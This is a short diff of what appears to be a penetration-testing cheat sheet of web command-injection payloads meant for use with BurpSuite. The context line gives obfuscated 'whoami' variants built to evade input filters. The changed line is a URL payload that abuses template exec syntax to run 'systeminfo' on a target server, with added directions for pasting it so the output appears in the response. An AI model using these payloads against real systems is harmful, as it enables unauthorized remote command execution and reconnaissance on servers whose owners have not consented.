@@ -22,7 +22,7 @@ You can use this on BurpSuite. Method below can be use on Web Penetration Testin
         <td>5. wh$()oami or whoam$(echo+i) or who'a'm(echo+i)</td>
     </tr>
     <tr>
-        <td>6. /?n=%0A%&index=%00&&cmd=systeminfo&search=%25xxx%url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}</td>
+        <td>6. " /?n=%0A%&index=%00&&cmd=systeminfo&search=%25xxx%url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} " put this without quotes, this will print the info in burpsuite response</td>
     </tr>
 </table>
 
